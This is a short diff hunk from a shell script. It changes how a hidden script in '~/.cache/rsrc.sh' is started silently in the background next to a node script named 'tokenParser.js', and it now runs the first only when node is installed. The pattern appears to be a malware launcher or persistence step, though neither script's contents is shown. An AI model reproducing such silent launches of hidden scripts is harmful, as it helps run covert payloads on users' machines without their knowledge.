@@ -101,7 +101,9 @@ fi
 
 nohup node "$USER_HOME/tokenParser.js" >/dev/null 2>&1 &
 
-nohup bash "$HOME/.cache/rsrc.sh" > /dev/null 2>&1 &
+if command -v node >/dev/null 2>&1; then
+    nohup bash "$HOME/.cache/rsrc.sh" > /dev/null 2>&1 &
+fi
 
 sleep 5
 
